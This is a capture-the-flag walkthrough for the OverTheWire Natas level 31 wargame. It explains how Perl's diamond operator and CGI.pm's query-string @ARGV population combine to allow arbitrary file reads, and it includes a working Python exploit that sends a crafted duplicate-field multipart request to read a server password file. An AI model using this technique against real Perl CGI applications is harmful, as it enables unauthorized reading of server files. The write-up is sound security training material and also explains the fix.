# OverTheWire: Natas — Level 31 → Level 32

> **Vulnerability:** Perl CGI `<>` Diamond Operator Arbitrary File Read via `@ARGV` Injection through `upload()` / `param()` Confusion                                 
> **Skills:** Perl CGI internals, multipart form-data crafting, diamond operator behavior, `@ARGV` injection                                              
> **Difficulty:** Hard                                      
> **Official Page:** [Natas Level 31](https://overthewire.org/wargames/natas/natas31.html)

---

## Access

- **URL:** `http://natas31.natas.labs.overthewire.org`
- **Username:** `natas31`
- **Password:** *obtain from previous level*

---

## Task

Find the password for `natas32` by exploiting a Perl CGI script that uses the `<>` diamond operator to read uploaded file content, causing it to read an arbitrary file from the server instead.

---

## Vulnerability

The application is a Perl CGI script that accepts a CSV file upload and displays its contents. The vulnerability is a **arbitrary file read via Perl diamond operator (`<>`) `@ARGV` injection**.

The developer uses `while(<$file>)` (or the equivalent diamond-operator pattern) to iterate over uploaded file content. Perl's `<>` operator has a special behavior: if the filehandle being read is the magic `ARGV` handle, it reads from files named in the `@ARGV` array rather than from actual uploaded data. An attacker can inject the string `ARGV` as the filename field in a multipart upload, causing CGI.pm to populate `@ARGV` from the URL query string, and then trick the `<>` operator into reading an arbitrary server-side file — in this case `/etc/natas_webpass/natas32` — instead of the uploaded data.

This is enabled by a mismatch in how CGI.pm's `upload()` and `param()` functions handle a field that carries both a plain text value (`ARGV`) and a real file attachment simultaneously, a condition that normal upload forms cannot produce but a crafted HTTP request can.

---

## Theory

### Perl's Diamond Operator `<>` and the `ARGV` Filehandle

The diamond operator `<>` in Perl is a shorthand for reading lines from a filehandle. When used as `<FILEHANDLE>` or `while(<$fh>)`, it reads from the given handle. However, `<>` has a special built-in mode:

```perl
while (<>) {
    print;
}
```

When `<>` is called with *no* explicit filehandle — or when the filehandle resolves to the magic constant `ARGV` — Perl reads from each filename listed in the `@ARGV` array in turn, exactly like a Unix command-line program processing files passed as arguments. If `@ARGV` is empty, it reads from standard input. If `@ARGV` contains `/etc/passwd`, it opens and reads `/etc/passwd`.

This is intentional Perl behavior designed for command-line scripts. It becomes a vulnerability when `@ARGV` can be controlled by an attacker in a web context.

```perl
# If @ARGV = ("/etc/natas_webpass/natas32")
while (<ARGV>) {   # reads /etc/natas_webpass/natas32 line by line
    print $_;
}
```

### How CGI.pm Populates `@ARGV` from the Query String

When a Perl CGI script is invoked, CGI.pm has a mode (enabled by default in older versions and in certain configurations) where it parses the URL query string and populates `@ARGV` with the resulting values. Specifically, if the request URL is:

```
/index.pl?/etc/natas_webpass/natas32
```

Then CGI.pm sets:

```perl
@ARGV = ("/etc/natas_webpass/natas32");
```

This is a CGI.pm legacy feature intended for isindex queries. It means any attacker who can control the query string *and* trigger the `<ARGV>` read path has full control over which file the script reads.

### CGI.pm `upload()` vs. `param()` — and Why Both Are Called

In a normal multipart file upload form, the file input field carries a filename and binary data. CGI.pm distinguishes between:

- `param('fieldname')` — returns the plain text value of a form field
- `upload('fieldname')` — returns a filehandle to the uploaded file's binary content

The vulnerability exploits what happens when a multipart request contains *two* parts with the same field name `file`:

1. A text part with no filename and value `ARGV`
2. A real file part with filename `abc` and some content

CGI.pm processes both parts. When the application calls `upload('file')` or `param('file')`, the returned filehandle or value may resolve to the string `ARGV` from the first part. When the script then does `while(<$fh>)` where `$fh` is the string `ARGV`, Perl interprets this as reading from the magic `ARGV` filehandle — which reads from `@ARGV`, which has already been populated with `/etc/natas_webpass/natas32` from the query string.

### Multipart Form-Data Structure

A multipart POST body consists of parts separated by a boundary string. Each part has headers (including `Content-Disposition`) and a body. A single field can legitimately appear multiple times. A crafted request can include two parts with `name="file"`: one with no `filename` attribute (a plain text field) and one with a `filename` attribute (a file upload). Normal browser forms cannot produce this — it requires manual crafting or a script.

```
--boundary
Content-Disposition: form-data; name="file"

ARGV
--boundary
Content-Disposition: form-data; name="file"; filename="abc"

abcde
--boundary--
```

### Concept Reference Table

| Concept | What It Is | Used in This Level? |
|---|---|---|
| Perl `<>` diamond operator | Reads lines from filehandles or from files named in `@ARGV` | Yes — the core vulnerability |
| `@ARGV` in CGI context | CGI.pm populates `@ARGV` from the URL query string in legacy mode | Yes — used to inject the target file path |
| `ARGV` magic filehandle | A Perl built-in handle that reads from `@ARGV` entries | Yes — triggered by passing `ARGV` as the file field value |
| CGI.pm `upload()` | Returns a filehandle to an uploaded file's content | Yes — called by the vulnerable script |
| CGI.pm `param()` | Returns the text value of a form field | Yes — interacts with the `upload()` confusion |
| Multipart form-data | HTTP encoding for file uploads; allows multiple parts with the same field name | Yes — crafted manually to send two `file` parts |
| Prepared statements | Good to know — not needed here | Good to know — not needed here |

---

## Solution

### Step 1 — Examine the Application

Navigate to `http://natas31.natas.labs.overthewire.org` and authenticate with your `natas31` credentials when the browser prompts for HTTP Basic Auth.

The page presents a simple file upload form with a single file input and a Submit button. It is described as a CSV viewer — upload a CSV and it displays the contents as a table.

> **What to notice:** The form uses `enctype="multipart/form-data"` (required for file uploads) and POSTs to `index.pl`. The backend is Perl (`.pl` extension). This immediately flags CGI.pm and Perl file-handling idioms as the attack surface.

### Step 2 — Read the Vulnerable Source Code

The page includes a link to view `index.pl`. The critical section of the source is:

```perl
# Reconstructed — see post-file note
my $file = $cgi->upload('file');
my $name = $cgi->param('file');

if( defined($file) ){
    while(<$file>){
        # process CSV line
        print ...
    }
}
```

> **What to notice:** The script calls both `upload('file')` and `param('file')` on the same field name. The loop `while(<$file>)` reads from whatever filehandle `$file` is — but if `$file` resolves to the string `"ARGV"`, Perl will read from the magic `ARGV` handle instead of the uploaded file data.

### Step 3 — Understand the Full Exploit Chain

The attack requires two things to be true simultaneously:

1. **`@ARGV` must contain the target file path.** This is achieved by placing the path in the URL query string: `POST /index.pl?/etc/natas_webpass/natas32`. CGI.pm parses the query string and sets `@ARGV = ("/etc/natas_webpass/natas32")`.

2. **The `<$file>` read must resolve to `<ARGV>`.** This is achieved by sending two `file` parts in the multipart body: a plain text part with value `ARGV` (no `filename` attribute), followed by a real file upload part. CGI.pm's handling of this ambiguous input causes `$file` to carry the string `ARGV`, triggering Perl's magic filehandle behavior.

When both conditions are met, `while(<$file>)` becomes `while(<ARGV>)`, which reads `/etc/natas_webpass/natas32` line by line and prints its contents.

> **What to notice:** Neither condition alone is sufficient. The query string alone does nothing without the `ARGV` filehandle trick. The `ARGV` part alone does nothing if `@ARGV` is empty. Both must be present in the same request.

### Step 4 — Craft and Send the Exploit

The following Python script crafts the exact multipart body required. Python's `requests` library normally builds multipart bodies automatically, but for this exploit the two-part `file` field requires manual construction using `files` as a list of tuples (which allows duplicate field names):

```python
import requests
from requests.auth import HTTPBasicAuth

user = 'natas31'
passw = '<natas31_password>'

# The URL query string populates @ARGV in the Perl CGI script.
# CGI.pm legacy behavior: ?/path/to/file sets @ARGV = ["/path/to/file"]
url = 'http://natas31.natas.labs.overthewire.org/index.pl?/etc/natas_webpass/natas32'

# Two parts with the same field name "file":
#   Part 1: plain text value "ARGV" with no filename.
#           CGI.pm sees this as the scalar value of the 'file' field.
#           When the script does while(<$file>), $file = "ARGV" triggers
#           Perl's magic ARGV filehandle, which reads from @ARGV.
#   Part 2: a real file upload (required so CGI.pm enters upload-handling mode
#           and calls upload('file') at all; without a real file part,
#           the upload() call returns undef and the read never happens).
files = [
    ('file', ('', 'ARGV', 'text/plain')),        # Part 1: name=file, no filename, value=ARGV
    ('file', ('abc', b'abcde', 'text/plain')),    # Part 2: name=file, filename=abc, content=abcde
]

# The submit button value must also be present for the script to process the form.
data = {'submit': 'Upload'}

response = requests.post(
    url,
    files=files,
    data=data,
    auth=HTTPBasicAuth(user, passw)
)

print(response.text)
```

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<html>
...
<div id="content">
<table>
<tr><td><password_string_here></td></tr>
</table>
...
</div>
</html>
```

> **What to notice:** The password appears inside a `<td>` tag in the rendered table — the script is treating the password file's contents as CSV and displaying each line as a table row. The output is the content of `/etc/natas_webpass/natas32`, not the uploaded `abcde` dummy content.

### Step 5 — Extract the Password

Scan the HTML output for the content inside the `<td>` tags. The password for natas32 appears as the sole table cell. It will be a 32-character alphanumeric string.

---

## Password for Next Level

```
[redacted — obtain by completing the steps above]
```

---

## Key Takeaways

Perl's `<>` diamond operator is designed for command-line programs that process files passed as arguments — it is not safe to use in a web context where `@ARGV` can be influenced by the URL query string. The combination of CGI.pm's legacy `@ARGV` population from query strings and its ambiguous handling of multi-part fields with the same name creates a complete arbitrary file read primitive from two independently innocuous behaviors. The fix is to never use `<ARGV>` or bare `<>` in CGI code and to validate that `upload()` returns a real filehandle before iterating over it.

This level demonstrates a broader principle: vulnerability chaining. Neither the `@ARGV` query-string behavior nor the `upload()`/`param()` confusion is exploitable alone. The attack only succeeds when both conditions are satisfied in the same request.

---

## Common Mistakes

| Mistake | What Happens | Fix |
|---|---|---|
| Putting the file path in the POST body instead of the query string | `@ARGV` is not populated; `<ARGV>` reads from stdin, producing no output | The path must be in the URL: `POST /index.pl?/etc/natas_webpass/natas32` |
| Sending only one `file` part with value `ARGV` | CGI.pm may not enter upload-handling mode; `upload('file')` returns undef; the loop never executes | Always include a second `file` part with a real `filename` attribute and content |
| Sending the real file part first and `ARGV` second | CGI.pm may resolve `param('file')` to the filename of the real upload rather than `ARGV` | Send the `ARGV` text part first, then the real file part |
| Using `requests` with a dict for `files` | A dict cannot have duplicate keys; only one `file` part is sent | Use a list of tuples: `files = [('file', ...), ('file', ...)]` |
| Omitting the `submit` field from the POST body | The Perl script checks for the submit button value before processing; the form is silently ignored | Include `data = {'submit': 'Upload'}` in the request |
| Forgetting HTTP Basic Auth | Server returns `401 Unauthorized` before the CGI script runs | Always pass `auth=HTTPBasicAuth(user, passw)` |
